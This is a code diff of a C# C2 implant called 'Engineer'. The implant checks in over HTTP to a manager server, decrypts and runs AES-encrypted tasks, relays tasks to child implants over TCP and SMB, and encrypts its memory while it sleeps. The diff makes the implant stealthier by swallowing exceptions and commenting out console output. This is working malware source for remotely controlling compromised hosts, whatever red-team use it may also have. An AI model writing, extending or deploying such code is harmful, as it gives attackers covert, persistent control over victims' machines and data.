@@ -60,67 +60,80 @@ namespace Engineer.Models
 
         public override async Task CheckIn()
 		{
-            //pick one of the strings in the Urls list and use it for the request
-            string url = Urls[new Random().Next(Urls.Count)];
-
-            var taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead); // gets anything waiting at the maanger for us to read, when this happens it triggers the HandleImplant in our TS 
-			
-            if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) != taskReturned || taskReturned.Status == TaskStatus.Faulted)
+            try
             {
-                for (int i = 0; i < ConnectionAttempts; i++)
+                //pick one of the strings in the Urls list and use it for the request
+                string url = Urls[new Random().Next(Urls.Count)];
+               // Console.WriteLine("Checking in with " + _client.BaseAddress + url);
+                var taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead); // gets anything waiting at the maanger for us to read, when this happens it triggers the HandleImplant in our TS 
+
+                if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) != taskReturned || taskReturned.Status == TaskStatus.Faulted)
                 {
-                    Console.WriteLine("Attempting to reconnect");
-                    SleepEncrypt.ExecuteSleep(Sleep);
-                    //Thread.Sleep(Sleep);
-                    //Sleepydll.ExecuteSleep(Sleep);
-                    taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
-                    if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) == taskReturned && taskReturned.Status != TaskStatus.Faulted)
+                    for (int i = 0; i < ConnectionAttempts; i++)
                     {
-                        break;
-                    }
-                    if(i == ConnectionAttempts)
-					{
-                        Environment.Exit(0);
-                    }
-                }
-            }
-            var HttpResponseMessageReturned = await taskReturned;
-			var EncryptedresponseByte = HttpResponseMessageReturned.Content.ReadAsByteArrayAsync().Result;
-			
-			if (EncryptedresponseByte.Count() > 0) //if response is NOT null, empty, or white space then decrypt and handle it
-			{
-                var DecryptedTaskMessage = Encryption.AES_Decrypt(EncryptedresponseByte,Program.MessagePathKey);
-				//Console.WriteLine("Response from Manager: " + EncryptedresponseByte.Length + " bytes");
-				var C2MessageList = DecryptedTaskMessage.ProDeserialize<List<C2TaskMessage>>();
-				//Console.WriteLine("C2TaskMessage deserialized");
-                foreach(C2TaskMessage taskMessage in C2MessageList)
-				{
-                    if(taskMessage.PathMessage.Count() == 1 )
-					{
-						Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
-                        var decTask = Encryption.AES_Decrypt(taskMessage.TaskData,Program.UniqueTaskKey);
-                        HandleResponse(decTask);
-                    }
-                    else
-					{
-						//read the path and see if it is a child engineer and forward it on.
-						taskMessage.PathMessage.RemoveAt(0);
-                        string dest = taskMessage.PathMessage[0];
-						Console.WriteLine($"{DateTime.Now} got task for child {dest}");
-                        var serializedTaskMessage = taskMessage.ProSerialise();
-						var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage,Program.MessagePathKey);
-						if (EngTCPComm.ParentToChildData.Count > 0)
-						{
-							EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
-						}
-						else if (EngSMBComm.ParentToChildData.Count > 0)
+                        //Console.WriteLine("Attempting to reconnect");
+                        if (Program.Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
                         {
-                            EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                            Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                        }
+                        else if (Program.Sleeptype == SleepEnum.SleepTypes.None)
+                        {
+                            Thread.Sleep(EngCommBase.Sleep);
+                        }
+                        taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
+                        if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) == taskReturned && taskReturned.Status != TaskStatus.Faulted)
+                        {
+                            break;
+                        }
+                        if (i == ConnectionAttempts)
+                        {
+                            Environment.Exit(0);
                         }
                     }
                 }
+                var HttpResponseMessageReturned = await taskReturned;
+                var EncryptedresponseByte = HttpResponseMessageReturned.Content.ReadAsByteArrayAsync().Result;
 
-			}
+                if (EncryptedresponseByte.Count() > 0) //if response is NOT null, empty, or white space then decrypt and handle it
+                {
+                    var DecryptedTaskMessage = Encryption.AES_Decrypt(EncryptedresponseByte, Program.MessagePathKey);
+                    //Console.WriteLine("Response from Manager: " + EncryptedresponseByte.Length + " bytes");
+                    var C2MessageList = DecryptedTaskMessage.JsonDeserialize<List<C2TaskMessage>>();
+                    //Console.WriteLine("C2TaskMessage deserialized");
+                    foreach (C2TaskMessage taskMessage in C2MessageList)
+                    {
+                        if (taskMessage.PathMessage.Count() == 1)
+                        {
+                            //Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
+                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), Program.UniqueTaskKey);
+                            HandleResponse(decTask);
+                        }
+                        else
+                        {
+                            //read the path and see if it is a child engineer and forward it on.
+                            taskMessage.PathMessage.RemoveAt(0);
+                            string dest = taskMessage.PathMessage[0];
+                            //Console.WriteLine($"{DateTime.Now} got task for child {dest}");
+                            var serializedTaskMessage = taskMessage.JsonSerialize();
+                            var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
+                            if (EngTCPComm.ParentToChildData.Count > 0)
+                            {
+                                EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                            }
+                            else if (EngSMBComm.ParentToChildData.Count > 0)
+                            {
+                                EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                            }
+                        }
+                    }
+
+                }
+            }
+            catch (Exception ex)
+            {
+               // Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);   
+            }
 		}
 		
 		public override async Task PostData()
@@ -128,7 +141,7 @@ namespace Engineer.Models
             try
             {
 				string url = Urls[new Random().Next(Urls.Count)];
-				var outbound = GetOutbound().ProSerialise(); // serialize the list into a byte array
+				var outbound = GetOutbound().JsonSerialize(); // serialize the list into a byte array
 				var Encryptedoutbound = Encryption.AES_Encrypt(outbound,Program.UniqueTaskKey); // encrypt the byte array
                 //turn the encrypted byte array into HttpContent
                 var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
@@ -139,13 +152,13 @@ namespace Engineer.Models
 				{
                     //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                     var decMessage = Encryption.AES_Decrypt(EncresponseContent, Program.MessagePathKey);
-                    var C2MessageList = decMessage.ProDeserialize<List<C2TaskMessage>>();
+                    var C2MessageList = decMessage.JsonDeserialize<List<C2TaskMessage>>();
                     //Console.WriteLine("C2TaskMessage deserialized");
                     foreach (C2TaskMessage taskMessage in C2MessageList)
                     {
                         if (taskMessage.PathMessage.Count() == 1)
                         {
-                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData, Program.UniqueTaskKey);
+                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), Program.UniqueTaskKey);
                             HandleResponse(decTask);
                         }
                         else
@@ -153,8 +166,8 @@ namespace Engineer.Models
                             //read the path and see if it is a child engineer and forward it on.
                             taskMessage.PathMessage.RemoveAt(0);
                             string dest = taskMessage.PathMessage[0];
-                            Console.WriteLine($"{DateTime.Now} got task for child {dest}");
-                            var serializedTaskMessage = taskMessage.ProSerialise();
+                            //Console.WriteLine($"{DateTime.Now} got task for child {dest}");
+                            var serializedTaskMessage = taskMessage.JsonSerialize();
                             var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
                             if (EngTCPComm.ParentToChildData.Count > 0)
                             {
@@ -171,7 +184,7 @@ namespace Engineer.Models
 			}
             catch (Exception e)
             {
-               Console.WriteLine(e.Message);
+               //Console.WriteLine(e.Message);
             }
 		}
 		
@@ -188,20 +201,20 @@ namespace Engineer.Models
                 //var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
                 
                 var response = await _client.PostAsync(url, EncryptedoutboundContent);
-                Console.WriteLine($"{DateTime.UtcNow} posting P2P Task Response, size {EncryptedoutboundContent.Headers.ContentLength} bytes");
+                //Console.WriteLine($"{DateTime.UtcNow} posting P2P Task Response, size {EncryptedoutboundContent.Headers.ContentLength} bytes");
 				var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                 if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
                 {
                     //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                     var decMessage = Encryption.AES_Decrypt(EncresponseContent,Program.MessagePathKey);
-                    var C2MessageList = decMessage.ProDeserialize<List<C2TaskMessage>>();
+                    var C2MessageList = decMessage.JsonDeserialize<List<C2TaskMessage>>();
                     //Console.WriteLine("C2TaskMessage deserialized");
                     foreach (C2TaskMessage taskMessage in C2MessageList)
                     {
 	                    //if pathing count is 1 then it is for this engineer
 	                    if (taskMessage.PathMessage.Count() == 1)
 	                    {
-		                    var decTask = Encryption.AES_Decrypt(taskMessage.TaskData, Program.UniqueTaskKey);
+		                    var decTask = Encryption.AES_Decrypt(taskMessage.TaskData.ToArray(), Program.UniqueTaskKey);
 		                    HandleResponse(decTask);
 	                    }
 	                    // if pathing is higher then 1 then it is for a child engineer
@@ -210,8 +223,8 @@ namespace Engineer.Models
 		                    //read the path and see if it is a child engineer and forward it on.
 		                    taskMessage.PathMessage.RemoveAt(0);
 		                    string dest = taskMessage.PathMessage[0];
-		                    Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
-		                    var serializedTaskMessage = taskMessage.ProSerialise();
+		                    //Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
+		                    var serializedTaskMessage = taskMessage.JsonSerialize();
 		                    var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
 		                    if (EngTCPComm.ParentToChildData.Count > 0)
 		                    {
@@ -228,7 +241,7 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                //Console.WriteLine(e.Message);
             }
 
         }
@@ -236,7 +249,7 @@ namespace Engineer.Models
 		private bool HandleResponse(byte[] response) //if not null we have stuff to do 
 		{
             
-            var tasks = response.ProDeserialize<List<EngineerTask>>();
+            var tasks = response.JsonDeserialize<List<EngineerTask>>();
 			
 			if (tasks != null && tasks.Any())
 			{
@@ -291,7 +304,7 @@ namespace Engineer.Models
 					//print the errors
 					foreach (var error in errors.ToString().Split(','))
 					{
-						Console.WriteLine(error);
+						//Console.WriteLine(error);
 					}
 					return false;
 
@@ -307,7 +320,7 @@ namespace Engineer.Models
 				_client.BaseAddress = new Uri("http://" + ConnectAddress + ":" + ConnectPort);
             }
             //Console.WriteLine($"metadata encryption key is {Program.MetadataKey}");
-			var encodedMetadata = Convert.ToBase64String(Encryption.AES_Encrypt(engineerMetadata.ProSerialise(),Program.MetadataKey)); // returns a base64 encoded string of AES encvrypted serilized json data
+			var encodedMetadata = Convert.ToBase64String(Encryption.AES_Encrypt(engineerMetadata.JsonSerialize(),Program.MetadataKey)); // returns a base64 encoded string of AES encvrypted serilized json data
 			_client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
             /*string EncryptedMetadataID = Convert.ToBase64String(Encryption.AES_Encrypt(Encoding.UTF8.GetBytes(engineerMetadata.Id), Program.MetadataKey));
             _client.DefaultRequestHeaders.Add("Authentication",$"{EncryptedMetadataID}");*/
